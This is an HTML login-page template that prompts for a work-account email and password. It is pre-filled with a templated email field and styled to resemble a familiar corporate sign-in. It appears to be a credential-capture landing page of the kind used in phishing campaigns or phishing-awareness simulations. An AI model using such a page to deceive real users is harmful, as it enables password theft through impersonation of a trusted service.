<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sign in to continue</title>
  <style>
    body { font-family: Segoe UI, Arial, sans-serif; background:#eef1f4; margin:0; }
    .box { max-width:400px; margin:80px auto; background:#fff; padding:32px; border-radius:6px; }
    h1 { font-size:22px; font-weight:600; }
    input { width:100%; padding:10px; margin:8px 0 14px; box-sizing:border-box; }
    button { width:100%; padding:12px; background:#0067b8; color:#fff; border:0; cursor:pointer; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Sign in</h1>
    <p>Use your work account to open this resource.</p>
    <form method="POST" action="">
      <input type="email" name="email" value="{{.Email}}" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Next</button>
    </form>
  </div>
</body>
</html>
